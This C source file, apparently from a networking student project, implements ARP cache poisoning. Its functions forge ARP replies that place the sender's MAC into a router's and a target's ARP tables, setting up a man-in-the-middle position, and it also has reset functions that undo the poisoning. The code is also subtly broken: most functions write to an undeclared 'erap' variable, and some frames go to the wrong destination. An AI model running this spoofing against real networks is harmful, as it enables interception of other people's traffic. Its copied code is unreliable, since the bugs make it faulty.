
#include <proginfo.h>
#include <arp.h>
#include <ftlibc.h>

#include <inttypes.h>
#include <netinet/if_ether.h>

static err_t send_arp(int fd, const struct sockaddr *sdest, const struct ether_arp *earp,
                      const uint8_t *src_mac, const uint8_t *dest_mac)
{
    uint8_t buff[sizeof(struct ethhdr) + sizeof(*earp)] = {0};

    struct ethhdr *const eth = (struct ethhdr *)buff;

    *eth = (struct ethhdr){
        .h_proto = ETH_P_ARP};

    ft_memcpy(eth->h_source, src_mac, SIZEOFMAC);
    ft_memcpy(eth->h_dest, dest_mac, SIZEOFMAC);

    struct ether_arp *earp_buffptr = (struct ether_arp *)(buff + sizeof(*eth));
    *earp_buffptr = *earp;

    const ssize_t sentbytes = sendto(fd, buff, sizeof(buff) / sizeof(*buff), 0, sdest, sizeof(*sdest));

    if (sentbytes < 0)
    {
        PRINT_ERROR(MSG_ERROR_SYSCALL, "sendto");
        return INVSYSCALL;
    }

    return SUCCESS;
}

/// Send standart ARP Request to the target, the target should reply.
err_t send_arp_request_to_target(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REQUEST),
    };

    ft_memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
    ft_memcpy(erap.arp_spa, info->mymachine.ip, SIZEOFIP);
    ft_memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);

    return send_arp(info->sockarp, (const struct sockaddr *)&info->target.addr,
                    (const struct ether_arp *)&earp, info->mymachine.mac, ETHER_BROADCAST_MAC);
}

/// Send standart ARP Request to the router, the router should reply.
err_t send_arp_request_to_router(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REQUEST),
    };

    ft_memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
    ft_memcpy(erap.arp_spa, info->mymachine.ip, SIZEOFIP);
    ft_memcpy(earp.arp_tpa, info->router.ip, SIZEOFIP);

    return send_arp(info->sockarp, (const struct sockaddr *)&info->target.addr,
                    (const struct ether_arp *)&earp, info->mymachine.mac, ETHER_BROADCAST_MAC);
}

/// Send standart ARP Reply to target
err_t send_arp_reply_to_target(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    ft_memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
    ft_memcpy(erap.arp_spa, info->mymachine.ip, SIZEOFIP);
    ft_memcpy(earp.arp_tha, info->target.mac, SIZEOFMAC);
    ft_memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);

    return send_arp(info->sockarp, (const struct sockaddr *)&info->target.addr,
                    (const struct ether_arp *)&earp, info->mymachine.mac, info->target.mac);
}

/// Spoof my MAC address into router's ARP table at target's ip index.
err_t spoof_router(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    ft_memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
    ft_memcpy(erap.arp_spa, info->target.ip, SIZEOFIP);
    ft_memcpy(earp.arp_tha, info->router.mac, SIZEOFMAC);
    ft_memcpy(earp.arp_tpa, info->router.ip, SIZEOFIP);

    return send_arp(info->sockarp, (const struct sockaddr *)&info->target.addr,
                    (const struct ether_arp *)&earp, info->mymachine.mac, info->target.mac);
}

/// Spoof my MAC address into target's ARP table at router's ip index.
err_t spoof_target(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    ft_memcpy(erap.arp_sha, info->mymachine.mac, SIZEOFMAC);
    ft_memcpy(erap.arp_spa, info->router.ip, SIZEOFIP);
    ft_memcpy(earp.arp_tha, info->target.mac, SIZEOFMAC);
    ft_memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);

    return send_arp(info->sockarp, (const struct sockaddr *)&info->target.addr,
                    (const struct ether_arp *)&earp, info->mymachine.mac, info->router.mac);
}

/// Remove my spoofed MAC address from target's ARP table (at router's ip index)
err_t reset_arp_target(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    ft_memcpy(erap.arp_sha, info->router.mac, SIZEOFMAC);
    ft_memcpy(erap.arp_spa, info->router.ip, SIZEOFIP);
    ft_memcpy(earp.arp_tha, info->target.mac, SIZEOFMAC);
    ft_memcpy(earp.arp_tpa, info->target.ip, SIZEOFIP);

    return send_arp(info->sockarp, (const struct sockaddr *)&info->target.addr,
                    (const struct ether_arp *)&earp, info->router.mac, info->target.mac);
}

/// Remove my spoofed MAC address from router's ARP table (at target's ip index)
err_t reset_arp_router(const proginfo_t *const info)
{
    struct ether_arp earp = (struct ether_arp){
        .arp_hrd = htons(HARWARE_TYPE),
        .arp_pro = htons(ETH_P_IP),
        .arp_hln = SIZEOFMAC,
        .arp_pln = SIZEOFIP,
        .arp_op = htons(ARP_REPLY),
    };

    ft_memcpy(erap.arp_sha, info->target.mac, SIZEOFMAC);
    ft_memcpy(erap.arp_spa, info->target.ip, SIZEOFIP);
    ft_memcpy(earp.arp_tha, info->router.mac, SIZEOFMAC);
    ft_memcpy(earp.arp_tpa, info->router.ip, SIZEOFIP);

    return send_arp(info->sockarp, (const struct sockaddr *)&info->target.addr,
                    (const struct ether_arp *)&earp, info->target.mac, info->target.mac);
}
